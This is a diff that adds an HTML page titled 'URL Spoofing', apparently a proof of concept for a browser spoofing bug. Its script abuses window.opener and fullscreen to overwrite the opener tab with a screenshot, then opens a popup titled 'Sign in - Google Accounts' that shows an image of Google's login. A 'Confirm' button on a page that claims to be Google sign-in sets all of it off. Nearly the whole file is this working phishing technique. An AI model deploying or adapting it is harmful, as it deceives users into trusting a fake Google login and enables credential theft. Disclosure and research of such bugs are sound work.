@@ -1,0 +1,83 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>URL Spoofing</title>
+
+    <style>
+    	#button {
+			width:  150px;
+			height: 35px;
+		}
+   	</style>
+	
+	<script>
+        function spoof() {
+
+        	var openerHTML = `
+        		<html>
+        			<head>
+        				<style>
+        					body {
+        						margin: 0;
+   								padding: 0;
+        					}
+
+        					#content {
+        						width:  100%;
+    							height: 100%;
+        					}
+        				</style>
+        			</head>
+
+        			<body>
+        				<img id="content" src="spoof.png"></img>
+        			</body>
+           		</html>
+        	`;
+
+        	var popupHTML = `
+        		<html>
+        			<head>
+        				<title>Sign in - Google Accounts</title>
+        				<style>
+        					body {
+        						margin: 0;
+   								padding: 0;
+        					}
+        					
+        					#content {
+        						width:  100%;
+    							height: 100%;
+        					}
+        				</style>
+        			</head>
+
+        			<body>
+        				<img id="content" src="sign.png"></img>
+        			</body>
+           		</html>
+        	`;
+
+            window.opener.document.documentElement.webkitRequestFullscreen();
+            window.opener.document.write(openerHTML);
+
+            var width=500, height=460, top=0, left=(screen.width/2)-(width/2);
+            var win = window.open("about:blank", "second", `width=${width},height=${height},top=${top},left=${left}`);
+			win.document.write(popupHTML);
+            window.close();	
+        }
+    </script>
+</head>
+
+<body>
+    <center>
+        <br>
+        <h1>
+        	Please confirm you want to signin into your Google Account<br><br>
+        	<button id="button" onclick="spoof();">Confirm</button>
+        </h1>
+    </center>
+</body>
+</html>
